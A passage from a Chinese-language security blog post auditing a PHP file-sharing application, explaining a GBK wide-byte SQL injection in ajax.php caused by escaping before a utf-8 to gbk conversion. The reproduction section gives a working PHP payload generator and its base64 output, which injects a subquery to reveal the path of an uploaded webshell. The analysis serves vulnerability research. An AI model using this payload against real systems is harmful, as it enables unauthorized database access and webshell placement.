<h1 id="0x06-宽字节注入"><a href="#0x06-宽字节注入" class="headerlink" title="0x06 宽字节注入"></a>0x06 宽字节注入</h1><p>此程序分为两个版本utf-8与gbk版，所以难免会有一些编码转换的地方，所以也难免发生不小心没有注意的地方。<br>函数<strong>convert_str()</strong>提供编码转换的功能<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glbal.inc.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert_str</span><span class="params">($in,$out,$str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	$str = $db-&gt;escape($str);</span><br><span class="line">	<span class="keyword">if</span>(function_exists(<span class="string">"iconv"</span>))&#123;</span><br><span class="line">		$str = iconv($in,$out,$str);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(function_exists(<span class="string">"mb_convert_encoding"</span>))&#123;</span><br><span class="line">		$str = mb_convert_encoding($str,$out,$in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $db-&gt;escape($str);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>查看调用该函数的文件，此处利用ajax.php一次宽字节注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ajax.php</span></span><br><span class="line"><span class="keyword">switch</span>($action)&#123;</span><br><span class="line">	...</span><br><span class="line">    $data = trim(gpc(<span class="string">'data'</span>,<span class="string">'P'</span>,<span class="string">''</span>));	</span><br><span class="line">    <span class="keyword">if</span>(strpos($data,<span class="string">','</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	   $file = unserialize(base64_decode($data));</span><br><span class="line">				<span class="comment">/*foreach($file as $k=&gt;$v)&#123;</span></span><br><span class="line"><span class="comment">				$file[$k] = $db-&gt;escape($file[$v]);</span></span><br><span class="line"><span class="comment">				&#125;*/</span></span><br><span class="line">				$file[file_id] = (int)$file[file_id];</span><br><span class="line">				$file[file_size] = (int)$file[file_size];</span><br><span class="line">				$file[file_description] = $db-&gt;escape(trim($file[file_description]));</span><br><span class="line">				$file[file_extension] = $db-&gt;escape(trim($file[file_extension]));</span><br><span class="line">				$file[file_name] = $db-&gt;escape(trim($file[file_name]));</span><br><span class="line">				$num = @$db-&gt;result_first(<span class="string">"select count(*) from &#123;$tpf&#125;files where yun_fid='&#123;$file[file_id]&#125;' and userid='$pd_uid'"</span>);</span><br><span class="line">				<span class="keyword">if</span>($num &amp;&amp; $file[file_id])&#123;</span><br><span class="line">					$tmp_ext = $file[file_extension] ? <span class="string">'.'</span>.$file[file_extension] : <span class="string">''</span>;</span><br><span class="line">					$msg = $file[file_name].$tmp_ext;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$report_status =<span class="number">0</span>;</span><br><span class="line">					$report_arr = explode(<span class="string">','</span>,$settings[<span class="string">'report_word'</span>]);</span><br><span class="line">					<span class="keyword">if</span>(count($report_arr))&#123;</span><br><span class="line">						<span class="keyword">foreach</span>($report_arr <span class="keyword">as</span> $value)&#123;</span><br><span class="line">							<span class="keyword">if</span> (strpos($file[<span class="string">'file_name'</span>],$value) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">								$report_status = <span class="number">2</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$ins = <span class="keyword">array</span>(</span><br><span class="line">					<span class="string">'yun_fid'</span> =&gt; $file[file_id],</span><br><span class="line">					<span class="string">'file_name'</span> =&gt; $file[file_name],</span><br><span class="line">					<span class="string">'file_key'</span> =&gt; $file_key,</span><br><span class="line">					<span class="string">'file_extension'</span> =&gt; $file[file_extension],</span><br><span class="line">					<span class="string">'file_mime'</span> =&gt; <span class="string">'application/octet-stream'</span>,</span><br><span class="line">					<span class="string">'file_description'</span> =&gt; $file[file_description],</span><br><span class="line">					<span class="string">'file_size'</span> =&gt; $file[<span class="string">'file_size'</span>],</span><br><span class="line">					<span class="string">'file_time'</span> =&gt; $timestamp,</span><br><span class="line">					<span class="string">'is_checked'</span> =&gt; $is_checked,</span><br><span class="line">					<span class="string">'in_share'</span> =&gt; $in_share,</span><br><span class="line">					<span class="string">'report_status'</span> =&gt; $report_status,</span><br><span class="line">					<span class="string">'userid'</span> =&gt; $pd_uid,</span><br><span class="line">					<span class="string">'folder_id'</span> =&gt; $folder_id ? $folder_id : <span class="number">-1</span>,</span><br><span class="line">					<span class="string">'ip'</span> =&gt; $onlineip,</span><br><span class="line">					);</span><br><span class="line">					$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">					$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br><span class="line">				&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
<p>关键代码在：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
<p>跟进函数<strong>sql_array()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_array</span> <span class="params">($arr)</span></span>&#123;</span><br><span class="line">		$ins = <span class="keyword">array</span>();</span><br><span class="line">		reset($arr);</span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">list</span>($c, $v) = each($arr))&#123;</span><br><span class="line">			$ins[] = ($v === <span class="keyword">NULL</span> ? sprintf(<span class="string">'`%s`=NULL'</span>, $c) : sprintf(<span class="string">'`%s`=\'%s\''</span>, $c, $v));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> implode(<span class="string">', '</span>, $ins);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>并且<strong>$ins</strong>=&gt;<strong>$file = unserialize(base64_decode($data))</strong>=&gt;<strong>$data = trim(gpc(‘data’,’P’,’’))</strong><br>所以我们可以传入$data,来控制$ins的值<br>将我们的输入base64解码后，反序列化成数组对象，最后传入sql语句。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
<p>最后执行语句的时候存在一处编码转换，也是这里直接导致了注入。<br>汉字在utf下为三个字节，在gbk下为两个字节，故而当我们传入的单引号被转义后<strong>\’</strong>，该单引号将会连同前三个字节在GBK下，被解释为两个字符，使得单引号逃逸。</p>
<h1 id="0x07-漏洞复现"><a href="#0x07-漏洞复现" class="headerlink" title="0x07  漏洞复现"></a>0x07  漏洞复现</h1><p>(1)无权限下上传shell(刚才已上传过shell.php)<br>(2)上传成功后通过sql注入获取shell文件的位置。<br>需要获取文件位置，那么我们需要一个可以回显文件位置的地方，这里存在回显的地方，我们在页面上看，也就标签处可以回显，也就是file_description，故而构造payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"file_id"</span>=&gt;<span class="string">"17007"</span>,<span class="string">"file_name"</span>=&gt;<span class="string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2464617461)x)#"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMTAwMCI7czo5OiJmaWxlX25hbWUiO3M6MTYyOiK5/icsYGluX3NoYXJlYD0xLGBmaWxlX2Rlc2NyaXB0aW9uYD0oc2VsZWN0IHguYSBmcm9tIChzZWxlY3QgY29uY2F0KGZpbGVfc3RvcmVfcGF0aCxmaWxlX3JlYWxfbmFtZSlhIGZyb20gcGRfZmlsZXMgd2hlcmUgZmlsZV9leHRlbnNpb249MHg3MDY4NzAzYTNhMjQ2NDYxNzQ2MSl4KSMiO30=</span><br></pre></td></tr></table></figure></p>
<p>不知道为什么这台电脑的数据库死活传不入数据库，但是复现的过程就是这样，可以参考参考链接的文章。</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
  
  <p class="site-author-name" itemprop="name">cookie</p>
  <div class="site-description motion-element" itemprop="description"></div>
</div>


  <nav class="site-state motion-element">
    
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">68</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    

    

    
  </nav>













          
          
        </div>
      </div>

      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cookie</span>

  

  
</div>


  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>










  
  













  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.2.0"></script>



  

  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  

  

  



  




  

  

  

  

  

  

  

  

  

  

  

  

  


  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
